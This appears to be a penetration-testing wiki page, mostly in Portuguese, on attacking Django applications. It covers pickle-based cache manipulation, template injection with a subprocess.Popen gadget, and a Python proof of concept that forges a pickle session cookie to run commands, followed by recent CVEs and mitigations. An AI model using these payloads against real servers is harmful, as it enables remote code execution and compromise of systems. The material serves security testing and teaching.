# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
O método padrão de armazenamento em cache do Django é [Python pickles](https://docs.python.org/3/library/pickle.html), o que pode levar a RCE se [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **Se um atacante conseguir acesso de escrita ao cache, ele pode escalar essa vulnerabilidade para RCE no servidor subjacente**.

O cache do Django é armazenado em um de quatro locais: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), ou um [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). O cache armazenado em um servidor Redis ou em um database é o vetor de ataque mais provável (Redis injection e SQL injection), mas um atacante também pode ser capaz de usar cache baseado em arquivos para transformar uma escrita arbitrária em RCE. Os mantenedores marcaram isso como não-problema. É importante notar que a pasta dos arquivos de cache, o nome da tabela SQL e os detalhes do servidor Redis variarão conforme a implementação.

This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
A Django Template Language (DTL) é **Turing-complete**. Se dados fornecidos pelo usuário forem renderizados como uma *template string* (por exemplo ao chamar `Template(user_input).render()` ou quando `|safe`/`format_html()` remove o auto-escaping), um atacante pode alcançar SSTI → RCE completo.

### Detecção
1. Procure por chamadas dinâmicas para `Template()` / `Engine.from_string()` / `render_to_string()` que incluam *qualquer* dado de requisição não sanitizado.
2. Envie um payload baseado em tempo ou aritmético:
```django
{{7*7}}
```
Se a saída renderizada contiver `49`, o input é compilado pelo engine de templates.

### Primitivo para RCE
O Django bloqueia acesso direto a `__import__`, mas o grafo de objetos do Python é alcançável:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Encontre o índice de `subprocess.Popen` (≈400–500 dependendo da build do Python) e execute comandos arbitrários:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Um gadget universal mais seguro é iterar até `cls.__name__ == 'Popen'`.

O mesmo gadget funciona em recursos de renderização de templates do **Debug Toolbar** ou **Django-CMS** que lidam incorretamente com a entrada do usuário.

---

### Veja também: ReportLab/xhtml2pdf PDF export RCE
Aplicações construídas sobre Django frequentemente integram xhtml2pdf/ReportLab para exportar views como PDF. Quando HTML controlado pelo usuário flui para a geração de PDF, rl_safe_eval pode avaliar expressões dentro de colchetes triplos `[[[ ... ]]]`, permitindo execução de código (CVE-2023-33733). Detalhes, payloads e mitigações:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## RCE em Cookie de Sessão baseado em Pickle
Se a configuração `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` estiver ativada (ou um serializer customizado que desserializa pickle), Django *descriptografa e desserializa (unpickles)* o cookie de sessão **antes** de chamar qualquer código de view. Portanto, possuir uma chave de assinatura válida (o `SECRET_KEY` do projeto por padrão) é suficiente para execução remota de código imediata.

### Requisitos do Exploit
* O servidor usa `PickleSerializer`.
* O atacante conhece / pode adivinhar `settings.SECRET_KEY` (leaks via GitHub, `.env`, páginas de erro, etc.).

### Prova de conceito
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Envie o cookie resultante, e o payload será executado com as permissões do worker WSGI.

**Mitigações**: Mantenha o `JSONSerializer` padrão, rotacione o `SECRET_KEY` e configure `SESSION_COOKIE_HTTPONLY`.

---

## Recent (2023-2025) High-Impact Django CVEs Pentesters Should Check
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (corrigido em 4 de junho de 2025). Permite que atacantes contrabandeiem quebras de linha/códigos ANSI em arquivos de log e envenenem a análise de logs a jusante. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* em `QuerySet.values()/values_list()` em `JSONField` (CVSS 9.8). Crie chaves JSON para sair da citação e executar SQL arbitrário. Corrigido em 4.2.15 / 5.0.8.

Sempre identifique a versão exata do framework via a página de erro `X-Frame-Options` ou o hash de `/static/admin/css/base.css` e teste o acima quando aplicável.

---

## References
* Lançamento de segurança do Django – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
